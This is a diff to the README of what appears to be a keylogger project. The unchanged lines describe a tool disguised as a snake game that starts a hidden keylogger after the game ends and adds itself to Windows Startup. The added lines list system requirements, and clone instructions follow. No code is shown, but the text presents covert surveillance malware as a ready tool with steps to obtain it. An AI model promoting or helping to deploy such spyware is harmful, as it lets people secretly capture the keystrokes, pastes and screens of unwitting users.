@@ -8,6 +8,10 @@
 - Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
 - Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
 ## Usage
+System requirements
+- MS Windows (tested on 10)
+- Python 2.7
+
 Quick start
 1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
 2. `cd Key-paste-screen-logger`
